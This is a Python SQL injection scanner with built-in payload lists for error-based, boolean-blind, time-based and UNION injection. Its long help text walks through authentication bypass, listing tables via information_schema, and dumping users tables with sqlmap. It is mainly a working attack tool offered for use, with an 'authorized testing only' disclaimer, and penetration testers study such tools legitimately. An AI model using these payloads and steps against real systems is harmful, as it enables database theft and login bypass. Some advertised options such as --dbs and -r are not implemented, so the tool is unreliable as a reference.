#!/usr/bin/env python3
"""
SQL Injection Scanner
Tests URLs for SQL injection vulnerabilities
For authorized security testing only

QUICK START:
    ./sqli_scanner.py -u "http://target.com/page?id=1"
    ./sqli_scanner.py -u "http://target.com/page?id=1" --dbs
    ./sqli_scanner.py -r request.txt
"""

import argparse
import sys
import re
import urllib.parse
import urllib.request
import ssl
import time
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor

# Colors
class C:
    R = '\033[91m'
    Y = '\033[93m'
    G = '\033[92m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    E = '\033[0m'

# SQL Injection payloads by category
PAYLOADS = {
    'error_based': [
        "'",
        "''",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "' OR 1=1#",
        "') OR ('1'='1",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "1 UNION SELECT NULL--",
        "-1 UNION SELECT 1,2,3--",
    ],
    'blind_boolean': [
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' AND 1=1 AND '1'='1",
        "1' AND 1=2 AND '1'='1",
    ],
    'blind_time': [
        "'; WAITFOR DELAY '0:0:5'--",  # MSSQL
        "' AND SLEEP(5)--",  # MySQL
        "'; SELECT SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1; SELECT pg_sleep(5)--",  # PostgreSQL
    ],
    'union_based': [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT 1,2,3--",
        "-1 UNION SELECT 1,@@version,3--",
        "' UNION SELECT username,password FROM users--",
    ]
}

# SQL error patterns
SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"PostgreSQL.*ERROR",
    r"Warning.*pg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"Driver.*SQL[\-\_\ ]*Server",
    r"OLE DB.*SQL Server",
    r"SQLServer JDBC Driver",
    r"Microsoft SQL Native Client",
    r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver",
    r"macaborone",
    r"SQLSTATE\[",
    r"Unclosed quotation mark",
    r"Syntax error",
    r"Oracle.*Driver",
    r"Warning.*oci_",
    r"Warning.*ora_",
    r"quoted string not properly terminated",
    r"SQL command not properly ended",
    r"ORA-\d{5}",
    r"CLI Driver.*DB2",
    r"DB2 SQL error",
    r"SQLite.*error",
    r"sqlite3.OperationalError",
    r"SQLITE_ERROR",
    r"Warning.*sqlite_",
    r"Warning.*SQLite",
    r"You have an error in your SQL syntax",
]

HELP_TEXT = """
================================================================================
                    SQL INJECTION SCANNER - COMPLETE GUIDE
================================================================================

WHAT IS SQL INJECTION AND WHY IS IT DANGEROUS?
----------------------------------------------
SQL Injection (SQLi) is one of the MOST CRITICAL web vulnerabilities. It lets
an attacker manipulate the database queries that a website makes.

Think of it like this: A website asks "Show me user #5" and the database
returns that user's info. With SQLi, an attacker can change that question to
"Show me ALL users" or even "DELETE all users."

WHY THIS MATTERS:
  • SQLi consistently ranks in OWASP Top 10 (#1 for years)
  • Can lead to complete database theft (usernames, passwords, credit cards)
  • Can allow authentication bypass (login without password)
  • Can lead to full server compromise in some cases
  • Many major breaches (Sony, LinkedIn, Yahoo) involved SQLi

HOW SQL INJECTION ACTUALLY WORKS
--------------------------------
Normal website behavior:
  User visits: http://shop.com/product?id=5
  Website runs: SELECT * FROM products WHERE id = '5'
  Result: Shows product #5

Attack behavior:
  Attacker visits: http://shop.com/product?id=5' OR '1'='1
  Website runs: SELECT * FROM products WHERE id = '5' OR '1'='1'
  Result: Shows ALL products (because '1'='1' is always true)

The single quote (') breaks out of the expected input and lets the attacker
add their own SQL commands. The database doesn't know the difference between
legitimate queries and attacker-injected ones.

UNDERSTANDING INJECTION TYPES
-----------------------------

ERROR-BASED SQLi (--technique E)
  WHAT IT IS: The easiest type. You inject bad SQL and the server shows an
              error message that reveals database information.

  EXAMPLE: Input: '
           Error: "You have an error in your SQL syntax near ''' at line 1"

  WHY USE IT: Fast, easy to confirm. Error messages often reveal database type.

  WHAT TO DO WHEN FOUND:
  → The error often tells you the database type (MySQL, PostgreSQL, etc.)
  → You can craft more specific payloads for that database
  → Try UNION attacks next to extract actual data

BOOLEAN-BASED BLIND SQLi (--technique B)
  WHAT IT IS: No error messages, but the page behaves differently for true
              vs false conditions. You ask yes/no questions.

  EXAMPLE:
    id=5' AND '1'='1  → Page shows normally (condition is TRUE)
    id=5' AND '1'='2  → Page is different/empty (condition is FALSE)

  WHY USE IT: Works when errors are hidden. You can extract data one bit
              at a time by asking "Is the first character of the password > 'm'?"

  WHAT TO DO WHEN FOUND:
  → This is slower but powerful
  → Use sqlmap with --technique=B to automate extraction
  → You can dump entire databases, just takes longer

TIME-BASED BLIND SQLi (--technique T)
  WHAT IT IS: No visible difference in page, but you can make the database
              WAIT before responding. If page takes 5 seconds, it's vulnerable.

  EXAMPLE:
    id=5' AND SLEEP(5)--    → Page takes 5 seconds to load
    id=5' AND SLEEP(0)--    → Page loads normally

  WHY USE IT: Last resort when there's NO visible difference in output.
              The only signal is response time.

  WHAT TO DO WHEN FOUND:
  → Confirm by varying sleep time (SLEEP(3) vs SLEEP(10))
  → Very slow to extract data but it works
  → Each character of data requires multiple requests

UNION-BASED SQLi (--technique U)
  WHAT IT IS: You COMBINE your query with the original using UNION.
              This lets you extract data directly in the page output.

  EXAMPLE:
    id=-1' UNION SELECT username,password FROM users--
    Page now shows usernames and passwords instead of product info!

  WHY USE IT: Fastest way to extract data. One request can dump entire tables.

  WHAT TO DO WHEN FOUND:
  → First find the number of columns (ORDER BY trick)
  → Then UNION SELECT with same number of columns
  → Extract database name, table names, then data

WHEN TO USE EACH TECHNIQUE
--------------------------

SCENARIO: "I want to quickly check if a parameter is vulnerable"
COMMAND:  ./sqli_scanner.py -u "http://target.com/page?id=1" --technique E
WHY:      Error-based is fastest. If errors are shown, you'll know immediately.
NEXT:     If vulnerable, try UNION to extract data. If no errors, try blind.

SCENARIO: "No SQL errors appear but I suspect SQLi"
COMMAND:  ./sqli_scanner.py -u "http://target.com/page?id=1" --technique B
WHY:      Boolean blind works when errors are suppressed. Compares page
          responses for true vs false conditions.
NEXT:     If different responses detected, the param is injectable. Use sqlmap.

SCENARIO: "Page looks identical no matter what I inject"
COMMAND:  ./sqli_scanner.py -u "http://target.com/page?id=1" --technique T --timeout 15
WHY:      Time-based is the last resort. Makes database sleep and measures
          response time. Use longer timeout to detect slow injections.
NEXT:     If delays detected, param is injectable. Data extraction will be slow.

SCENARIO: "I found SQLi and want to extract data"
COMMAND:  ./sqli_scanner.py -u "http://target.com/page?id=1" --technique U --dbs
WHY:      UNION-based extracts data directly. --dbs attempts to list databases.
NEXT:     Get table names, then column names, then dump the data.

SCENARIO: "Testing a login form (POST request)"
COMMAND:  ./sqli_scanner.py -u "http://target.com/login" --data "user=admin&pass=test" -p user
WHY:      Login forms are prime SQLi targets. Tests POST parameter 'user'.
          Classic attack: user=' OR '1'='1'-- bypasses authentication.
NEXT:     If vulnerable, you can likely login as any user or first user in DB.

COMMON VULNERABLE LOCATIONS
---------------------------
SQLi can occur anywhere user input reaches a database query:

LOGIN FORMS:
  • Username and password fields
  • "Remember me" tokens
  • Password reset forms

SEARCH FEATURES:
  • Search boxes
  • Filter dropdowns
  • Sort parameters (ORDER BY injection)

URL PARAMETERS:
  • ?id=1, ?page=1, ?cat=5
  • Anything that looks up data

HIDDEN FIELDS:
  • Form hidden inputs
  • Cookie values
  • HTTP headers (User-Agent, Referer, X-Forwarded-For)

WHAT TO DO AFTER FINDING SQLi
-----------------------------

1. CONFIRM THE VULNERABILITY
   • Reproduce it manually
   • Document the exact payload that works
   • Note the database type from errors

2. ASSESS THE IMPACT
   • Can you extract data?
   • Can you bypass authentication?
   • Can you modify/delete data?
   • Can you execute OS commands? (rare but devastating)

3. EXTRACT DATA (if authorized)
   • List databases: SELECT schema_name FROM information_schema.schemata
   • List tables: SELECT table_name FROM information_schema.tables
   • List columns: SELECT column_name FROM information_schema.columns
   • Dump data: SELECT * FROM users

4. USE SQLMAP FOR HEAVY LIFTING
   sqlmap is the standard tool for SQLi exploitation:
   • sqlmap -u "http://target.com/page?id=1" --dbs
   • sqlmap -u "http://target.com/page?id=1" -D dbname --tables
   • sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

DATABASE-SPECIFIC CHEAT SHEET
-----------------------------

MYSQL:
  • Version: SELECT @@version
  • Current DB: SELECT database()
  • List DBs: SELECT schema_name FROM information_schema.schemata
  • Comment: -- or #
  • String concat: CONCAT('a','b')
  • Time delay: SLEEP(5)

POSTGRESQL:
  • Version: SELECT version()
  • Current DB: SELECT current_database()
  • List DBs: SELECT datname FROM pg_database
  • Comment: --
  • String concat: 'a' || 'b'
  • Time delay: pg_sleep(5)

MSSQL:
  • Version: SELECT @@version
  • Current DB: SELECT db_name()
  • List DBs: SELECT name FROM master..sysdatabases
  • Comment: --
  • String concat: 'a' + 'b'
  • Time delay: WAITFOR DELAY '0:0:5'

COMMON MISTAKES TO AVOID
------------------------
❌ Testing production systems without authorization
❌ Using destructive payloads (DROP TABLE)
❌ Ignoring POST parameters (often more vulnerable than GET)
❌ Giving up after one technique fails (try all techniques)
❌ Not checking authenticated areas (login first, then test)
❌ Forgetting about cookies and headers as injection points

QUICK REFERENCE
---------------
./sqli_scanner.py -u "URL?param=value"          # Basic test
./sqli_scanner.py -u "URL" --data "p=v" -p p    # POST parameter
./sqli_scanner.py -u "URL" --technique E        # Error-based only
./sqli_scanner.py -u "URL" --technique B        # Boolean blind only
./sqli_scanner.py -u "URL" --technique T        # Time-based blind
./sqli_scanner.py -u "URL" --technique U        # Union-based
./sqli_scanner.py -u "URL" --cookie "sess=x"   # With cookies
./sqli_scanner.py -u "URL" --proxy http://127.0.0.1:8080  # Through Burp

================================================================================
"""

def banner():
    print(f"""{C.R}
   _____ ____    __    _    _____
  / ___// __ \  / /   (_)  / ___/_________ _____
  \__ \/ / / / / /   / /   \__ \/ ___/ __ `/ __ \\
 ___/ / /_/ / / /___/ /   ___/ / /__/ /_/ / / / /
/____/\___\_\/_____/_/   /____/\___/\__,_/_/ /_/
{C.E}{C.Y}SQL Injection Scanner{C.E}
""")

class SQLiScanner:
    def __init__(self, timeout: int = 10, proxy: str = None, user_agent: str = None):
        self.timeout = timeout
        self.proxy = proxy
        self.user_agent = user_agent or 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        self.baseline_response = None
        self.baseline_length = 0
        self.baseline_time = 0

    def make_request(self, url: str, method: str = 'GET', data: str = None,
                     cookies: str = None) -> Tuple[str, float, int]:
        """Make HTTP request and return response, time, status"""
        try:
            headers = {'User-Agent': self.user_agent}
            if cookies:
                headers['Cookie'] = cookies

            # Handle SSL
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            if data and method == 'POST':
                data = data.encode('utf-8')
                headers['Content-Type'] = 'application/x-www-form-urlencoded'

            req = urllib.request.Request(url, data=data if method == 'POST' else None,
                                         headers=headers, method=method)

            start_time = time.time()

            if self.proxy:
                proxy_handler = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
                opener = urllib.request.build_opener(proxy_handler, urllib.request.HTTPSHandler(context=ctx))
            else:
                opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))

            response = opener.open(req, timeout=self.timeout)
            elapsed = time.time() - start_time
            content = response.read().decode('utf-8', errors='ignore')

            return content, elapsed, response.status

        except urllib.error.HTTPError as e:
            content = e.read().decode('utf-8', errors='ignore') if hasattr(e, 'read') else ''
            return content, 0, e.code
        except Exception as e:
            return str(e), 0, 0

    def get_baseline(self, url: str, method: str = 'GET', data: str = None, cookies: str = None):
        """Get baseline response for comparison"""
        response, elapsed, status = self.make_request(url, method, data, cookies)
        self.baseline_response = response
        self.baseline_length = len(response)
        self.baseline_time = elapsed
        return response

    def check_sql_errors(self, response: str) -> List[str]:
        """Check for SQL error messages in response"""
        found = []
        for pattern in SQL_ERRORS:
            if re.search(pattern, response, re.IGNORECASE):
                found.append(pattern)
        return found

    def inject_payload(self, url: str, param: str, payload: str,
                       method: str = 'GET', data: str = None) -> str:
        """Inject payload into parameter"""
        encoded_payload = urllib.parse.quote(payload)

        if method == 'GET':
            # Parse URL and inject into parameter
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            if param in params:
                params[param] = [params[param][0] + payload]
            else:
                params[param] = [payload]

            new_query = urllib.parse.urlencode(params, doseq=True)
            injected_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
            )
            return injected_url
        else:
            # Inject into POST data
            if data:
                params = urllib.parse.parse_qs(data)
                if param in params:
                    params[param] = [params[param][0] + payload]
                return urllib.parse.urlencode(params, doseq=True)
        return url

    def test_error_based(self, url: str, param: str, method: str = 'GET',
                         data: str = None, cookies: str = None) -> Dict:
        """Test for error-based SQL injection"""
        results = {'vulnerable': False, 'payloads': [], 'errors': []}

        for payload in PAYLOADS['error_based']:
            injected = self.inject_payload(url, param, payload, method, data)

            if method == 'GET':
                response, _, _ = self.make_request(injected, cookies=cookies)
            else:
                response, _, _ = self.make_request(url, 'POST', injected, cookies)

            errors = self.check_sql_errors(response)

            if errors:
                results['vulnerable'] = True
                results['payloads'].append(payload)
                results['errors'].extend(errors)
                print(f"  {C.R}[VULNERABLE]{C.E} Error-based: {payload[:30]}...")
                break

        return results

    def test_boolean_blind(self, url: str, param: str, method: str = 'GET',
                           data: str = None, cookies: str = None) -> Dict:
        """Test for boolean-based blind SQL injection"""
        results = {'vulnerable': False, 'payloads': []}

        # Get baseline
        self.get_baseline(url, method, data, cookies)

        # Test true condition
        true_payload = "' AND '1'='1"
        true_url = self.inject_payload(url, param, true_payload, method, data)

        if method == 'GET':
            true_response, _, _ = self.make_request(true_url, cookies=cookies)
        else:
            true_response, _, _ = self.make_request(url, 'POST', true_url, cookies)

        # Test false condition
        false_payload = "' AND '1'='2"
        false_url = self.inject_payload(url, param, false_payload, method, data)

        if method == 'GET':
            false_response, _, _ = self.make_request(false_url, cookies=cookies)
        else:
            false_response, _, _ = self.make_request(url, 'POST', false_url, cookies)

        # Compare responses
        true_len = len(true_response)
        false_len = len(false_response)

        if abs(true_len - self.baseline_length) < 100 and abs(false_len - self.baseline_length) > 100:
            results['vulnerable'] = True
            results['payloads'] = [true_payload, false_payload]
            results['difference'] = abs(true_len - false_len)
            print(f"  {C.R}[VULNERABLE]{C.E} Boolean-blind: Response differs by {results['difference']} chars")

        return results

    def test_time_blind(self, url: str, param: str, method: str = 'GET',
                        data: str = None, cookies: str = None, delay: int = 5) -> Dict:
        """Test for time-based blind SQL injection"""
        results = {'vulnerable': False, 'payloads': [], 'dbms': None}

        time_payloads = [
            ("' AND SLEEP({})--", 'MySQL'),
            ("'; WAITFOR DELAY '0:0:{}'--", 'MSSQL'),
            ("'; SELECT pg_sleep({})--", 'PostgreSQL'),
            ("' AND (SELECT * FROM (SELECT(SLEEP({})))a)--", 'MySQL'),
        ]

        for payload_template, dbms in time_payloads:
            payload = payload_template.format(delay)
            injected = self.inject_payload(url, param, payload, method, data)

            print(f"  {C.B}[*]{C.E} Testing {dbms} time-based...")

            start = time.time()
            if method == 'GET':
                self.make_request(injected, cookies=cookies)
            else:
                self.make_request(url, 'POST', injected, cookies)
            elapsed = time.time() - start

            if elapsed >= delay - 1:
                results['vulnerable'] = True
                results['payloads'].append(payload)
                results['dbms'] = dbms
                results['delay'] = elapsed
                print(f"  {C.R}[VULNERABLE]{C.E} Time-blind ({dbms}): {elapsed:.1f}s delay")
                break

        return results

    def test_union(self, url: str, param: str, method: str = 'GET',
                   data: str = None, cookies: str = None) -> Dict:
        """Test for UNION-based SQL injection"""
        results = {'vulnerable': False, 'columns': 0, 'payloads': []}

        # Find number of columns
        for i in range(1, 20):
            nulls = ','.join(['NULL'] * i)
            payload = f"' UNION SELECT {nulls}--"
            injected = self.inject_payload(url, param, payload, method, data)

            if method == 'GET':
                response, _, status = self.make_request(injected, cookies=cookies)
            else:
                response, _, status = self.make_request(url, 'POST', injected, cookies)

            errors = self.check_sql_errors(response)

            if not errors and status == 200:
                results['vulnerable'] = True
                results['columns'] = i
                results['payloads'].append(payload)
                print(f"  {C.R}[VULNERABLE]{C.E} Union-based: {i} columns")
                break

        return results

def extract_params(url: str, data: str = None) -> List[str]:
    """Extract parameters from URL and POST data"""
    params = []

    # URL params
    parsed = urllib.parse.urlparse(url)
    url_params = urllib.parse.parse_qs(parsed.query)
    params.extend(url_params.keys())

    # POST params
    if data:
        post_params = urllib.parse.parse_qs(data)
        params.extend(post_params.keys())

    return list(set(params))

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Scanner')
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-p', '--param', help='Parameter to test')
    parser.add_argument('--data', help='POST data')
    parser.add_argument('-r', '--request', help='Load request from file')
    parser.add_argument('--technique', default='EBTU',
                       help='Techniques: E=error, B=boolean, T=time, U=union')
    parser.add_argument('--cookie', help='Cookies')
    parser.add_argument('--user-agent', help='Custom User-Agent')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout')
    parser.add_argument('--threads', type=int, default=5, help='Threads')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('--help-full', action='store_true', help='Show detailed help')

    args = parser.parse_args()

    if args.help_full:
        print(HELP_TEXT)
        return

    if not args.url and not args.request:
        banner()
        parser.print_help()
        print(f"\n{C.Y}Tip:{C.E} Use --help-full for detailed guide")
        return

    banner()

    # Initialize scanner
    scanner = SQLiScanner(
        timeout=args.timeout,
        proxy=args.proxy,
        user_agent=args.user_agent
    )

    url = args.url
    method = 'POST' if args.data else 'GET'

    # Get parameters to test
    params = [args.param] if args.param else extract_params(url, args.data)

    if not params:
        print(f"{C.R}[!]{C.E} No parameters found to test")
        return

    print(f"{C.B}[*]{C.E} Target: {url}")
    print(f"{C.B}[*]{C.E} Method: {method}")
    print(f"{C.B}[*]{C.E} Parameters: {', '.join(params)}")
    print(f"{C.B}[*]{C.E} Techniques: {args.technique}")
    print()

    all_results = {}

    for param in params:
        print(f"{C.M}[+] Testing parameter: {param}{C.E}")
        results = {'param': param, 'tests': {}}

        if 'E' in args.technique.upper():
            print(f"{C.B}[*]{C.E} Error-based test...")
            results['tests']['error'] = scanner.test_error_based(
                url, param, method, args.data, args.cookie)

        if 'B' in args.technique.upper():
            print(f"{C.B}[*]{C.E} Boolean-blind test...")
            results['tests']['boolean'] = scanner.test_boolean_blind(
                url, param, method, args.data, args.cookie)

        if 'T' in args.technique.upper():
            print(f"{C.B}[*]{C.E} Time-blind test...")
            results['tests']['time'] = scanner.test_time_blind(
                url, param, method, args.data, args.cookie)

        if 'U' in args.technique.upper():
            print(f"{C.B}[*]{C.E} Union-based test...")
            results['tests']['union'] = scanner.test_union(
                url, param, method, args.data, args.cookie)

        all_results[param] = results
        print()

    # Summary
    print(f"{C.B}{'='*50}{C.E}")
    print(f"{C.B}SUMMARY{C.E}")
    print(f"{C.B}{'='*50}{C.E}")

    vulnerable_params = []
    for param, data in all_results.items():
        for test_name, test_result in data['tests'].items():
            if test_result.get('vulnerable'):
                vulnerable_params.append((param, test_name))
                print(f"{C.R}[VULNERABLE]{C.E} {param} ({test_name})")

    if not vulnerable_params:
        print(f"{C.G}[SAFE]{C.E} No SQL injection vulnerabilities found")

    # Save output
    if args.output:
        with open(args.output, 'w') as f:
            import json
            json.dump(all_results, f, indent=2, default=str)
        print(f"\n{C.B}[*]{C.E} Results saved to {args.output}")

if __name__ == '__main__':
    main()
